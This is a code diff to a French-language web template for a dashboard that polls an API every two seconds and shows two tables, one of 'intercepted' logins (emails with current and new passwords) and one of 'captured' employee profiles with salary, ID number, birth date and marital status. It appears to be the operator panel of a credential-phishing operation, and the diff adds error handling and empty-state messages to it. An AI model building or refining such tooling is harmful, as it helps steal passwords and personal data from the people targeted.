@@ -93,30 +93,44 @@
 
 <script>
     setInterval(async () => {
-        const response = await fetch('/api/data');
-        const data = await response.json();
-        
-        const loginsBody = document.getElementById('logins-body');
-        loginsBody.innerHTML = data.logins.map(log => `
-            <tr class="border-b">
-                <td class="p-2">${log.timestamp}</td>
-                <td class="p-2 font-semibold text-slate-900">${log.email}</td>
-                <td class="p-2 font-mono text-red-600">${log.current_password}</td>
-                <td class="p-2 font-mono text-blue-600">${log.new_password}</td>
-            </tr>
-        `).join('');
+        try {
+            const response = await fetch('/api/data');
+            const data = await response.json();
+            
+            // Mise à jour du tableau des Identifiants Interceptés
+            const loginsBody = document.getElementById('logins-body');
+            if (data.logins && data.logins.length > 0) {
+                loginsBody.innerHTML = data.logins.map(log => `
+                    <tr class="border-b">
+                        <td class="p-2">${log.timestamp || ''}</td>
+                        <td class="p-2 font-semibold text-slate-900">${log.email || ''}</td>
+                        <td class="p-2 font-mono text-red-600">${log.current_password || ''}</td>
+                        <td class="p-2 font-mono text-blue-600">${log.new_password || ''}</td>
+                    </tr>
+                `).join('');
+            } else {
+                loginsBody.innerHTML = `<tr><td colspan="4" class="p-4 text-center text-slate-400">Aucun identifiant intercepté</td></tr>`;
+            }
 
-        const profilesBody = document.getElementById('profiles-body');
-        profilesBody.innerHTML = data.profiles.map(prof => `
-            <tr class="border-b">
-                <td class="p-2 font-semibold text-slate-900">${prof.nom || ''} ${prof.postnom || ''}</td>
-                <td class="p-2">${prof.poste || ''}</td>
-                <td class="p-2">${prof.salaire_actuel || ''}</td>
-                <td class="p-2">${prof.anciennete || ''}</td>
-                <td class="p-2 font-mono text-amber-600">${prof.cus_num || ''}</td>
-                <td class="p-2">${prof.date_naissance || ''} (${prof.etat_civil || ''})</td>
-            </tr>
-        `).join('');
+            // Mise à jour du tableau des Profils Détaillés
+            const profilesBody = document.getElementById('profiles-body');
+            if (data.profiles && data.profiles.length > 0) {
+                profilesBody.innerHTML = data.profiles.map(prof => `
+                    <tr class="border-b">
+                        <td class="p-2 font-semibold text-slate-900">${prof.nom || ''} ${prof.postnom || ''}</td>
+                        <td class="p-2">${prof.poste || ''}</td>
+                        <td class="p-2">${prof.salaire_actuel || ''}</td>
+                        <td class="p-2">${prof.anciennete || ''}</td>
+                        <td class="p-2 font-mono text-amber-600">${prof.cus_num || ''}</td>
+                        <td class="p-2">${prof.date_naissance || ''} (${prof.etat_civil || ''})</td>
+                    </tr>
+                `).join('');
+            } else {
+                profilesBody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-400">Aucun profil capturé</td></tr>`;
+            }
+        } catch (error) {
+            console.error("Erreur lors de la récupération des données de l'API :", error);
+        }
     }, 2000);
 </script>
 {% endblock %}
